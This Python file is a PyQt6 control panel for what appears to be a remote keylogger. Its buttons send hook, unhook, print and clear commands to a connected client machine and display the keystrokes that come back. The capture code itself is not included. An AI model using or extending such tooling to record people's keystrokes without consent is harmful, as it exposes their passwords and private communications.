from keylogDesigner import KeylogDesigner
import globalVar
import utils
from PyQt6.QtWidgets import QApplication
import sys


class KeylogApp(KeylogDesigner):
    def __init__(self):
        super().__init__()

    def onButtonHookClick(self):
        utils.send(globalVar.client, "keylogHook()")

    def onButtonUnhookClick(self):
        utils.send(globalVar.client, "keylogUnhook()")

    def onButtonPrintKeyClick(self):
        utils.send(globalVar.client, "keylogPrint()")

        self.txtOutput.setText(utils.readStr(globalVar.client))

    def onButtonClearClick(self):
        utils.send(globalVar.client, "keylogClear()")

        self.txtOutput.setText("")

    def closeEvent(self, event):
        self.onButtonUnhookClick()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    keylogApp = KeylogApp()
    keylogApp.show()
    sys.exit(app.exec())
